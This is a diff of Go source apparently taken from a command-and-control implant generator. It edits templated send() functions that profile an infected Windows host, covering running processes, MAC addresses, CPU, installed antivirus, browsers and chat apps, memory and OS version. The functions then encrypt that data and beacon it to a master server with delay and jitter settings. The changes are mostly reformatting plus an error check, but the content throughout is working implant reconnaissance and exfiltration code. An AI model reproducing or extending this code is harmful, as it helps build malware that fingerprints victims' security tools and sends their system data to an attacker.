@@ -316,58 +316,64 @@ func GetArch() string {
 	return runtime.GOARCH
 }
 func send() { //发送头部信息
-    Process_win := getProcess_list()
-    lowerSet := make(map[string]bool)
-    for _, p := range Process_win {
-        lowerSet[strings.ToLower(p)] = true
-    }
-    macs := getMACAddresses() //获取地址
-    cpuInfo := getCPUFromRegistry()
-    Antivirus := matchAntivirus(lowerSet)
-    Browsers := matchBrowsers(lowerSet)
-    ChatApps := matchChatApps(lowerSet)
-    vmStat, _ := mem.VirtualMemory()
-    systemType := getWindowsVersion()
-    Arm := GetArch()
-    usedGB := strconv.FormatFloat(float64(vmStat.Used)/(1024*1024*1024), 'f', 1, 64)
-    totalGB := strconv.FormatFloat(float64(vmStat.Total)/(1024*1024*1024), 'f', 1, 64)
-    percent := strconv.FormatFloat(vmStat.UsedPercent, 'f', 0, 64)
-    memoryStr := usedGB + "/" + totalGB + " GB (" + percent + "%)"
-
+	Process_win := getProcess_list()
+	lowerSet := make(map[string]bool)
+	for _, p := range Process_win {
+		lowerSet[strings.ToLower(p)] = true
+	}
+	macs := getMACAddresses() //获取地址
+	cpuInfo := getCPUFromRegistry()
+	Antivirus := matchAntivirus(lowerSet)
+	Browsers := matchBrowsers(lowerSet)
+	ChatApps := matchChatApps(lowerSet)
+	memoryStr := "unknown"
+	if vmStat, err := mem.VirtualMemory(); err == nil && vmStat != nil {
+		usedGB := strconv.FormatFloat(float64(vmStat.Used)/(1024*1024*1024), 'f', 1, 64)
+		totalGB := strconv.FormatFloat(float64(vmStat.Total)/(1024*1024*1024), 'f', 1, 64)
+		percent := strconv.FormatFloat(vmStat.UsedPercent, 'f', 0, 64)
+		memoryStr = usedGB + "/" + totalGB + " GB (" + percent + "%)"
+	}
+	systemType := getWindowsVersion()
+	Arm := GetArch()
+	re_url := protocol + master + "//*Path*/?/*option*/=/*info*/"
+	currentDir, _ := os.Getwd()
+	currentDir = strings.ReplaceAll(currentDir, "\\", "/")
+	parts := strings.Split(master, ":")
+	executable, _ := os.Executable()
+	a_Mutex.RLock()
+	delay_ := delay
+	version_ := version
+	clientname_ := clientname
+	jitter_ := jitter
+	a_Mutex.RUnlock()
+	dataList := []string{clientname_, user, osname, strconv.Itoa(int(delay_)), getInternalIPs(), currentDir, version_, parts[len(parts)-1], protocol, strconv.Itoa(int(jitter_)), executable, macs, cpuInfo, Antivirus, Browsers, ChatApps, memoryStr, systemType, Arm,}
+	encodedData, err := json.Marshal(dataList)
+	if err != nil {
+		return
+	}
+	add_str := string(encodedData)
+	encry_str := get_encry_s(&add_str)
+	data := map[string]string{"/*uid*/": uid, "/*result*/": encry_str}
+	post(data, re_url)
+}
+    `
+    }else{
+        send = `
+func send() {
     re_url := protocol + master + "//*Path*/?/*option*/=/*info*/"
     currentDir, _:= os.Getwd()
     currentDir = strings.ReplaceAll(currentDir, "\\", "/")
     parts := strings.Split(master, ":")
-	executable, _ := os.Executable()
+    executable, _ := os.Executable()
     a_Mutex.RLock();delay_ := delay;version_:=version;clientname_:= clientname;jitter_:=jitter;a_Mutex.RUnlock()
-    dataList := []string{clientname_,user,osname,strconv.Itoa(int(delay_)),getInternalIPs(),currentDir,version_,parts[len(parts)-1],protocol,strconv.Itoa(int(jitter_)),executable,macs,cpuInfo,Antivirus,Browsers,ChatApps,memoryStr,systemType,Arm,}
+    dataList := []string{clientname_,user,osname,strconv.Itoa(int(delay_)),getInternalIPs(),currentDir,version_,parts[len(parts)-1],protocol,strconv.Itoa(int(jitter_)),executable,}
     encodedData, err := json.Marshal(dataList)
-    if err != nil {
-        return
-    }
+    if err != nil {return}
     add_str := string(encodedData)
     encry_str := get_encry_s(&add_str)
     data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
     post(data, re_url)
 }
-    `
-    }else{
-        send = `
-        func send() {
-            re_url := protocol + master + "//*Path*/?/*option*/=/*info*/"
-            currentDir, _:= os.Getwd()
-            currentDir = strings.ReplaceAll(currentDir, "\\", "/")
-            parts := strings.Split(master, ":")
-			executable, _ := os.Executable()
-            a_Mutex.RLock();delay_ := delay;version_:=version;clientname_:= clientname;jitter_:=jitter;a_Mutex.RUnlock()
-            dataList := []string{clientname_,user,osname,strconv.Itoa(int(delay_)),getInternalIPs(),currentDir,version_,parts[len(parts)-1],protocol,strconv.Itoa(int(jitter_)),executable,}
-            encodedData, err := json.Marshal(dataList)
-            if err != nil {return}
-            add_str := string(encodedData)
-            encry_str := get_encry_s(&add_str)
-            data:= map[string]string{"/*uid*/":uid,"/*result*/":encry_str}
-            post(data, re_url)
-        }
         `
     }
     if protocol == "quic"{
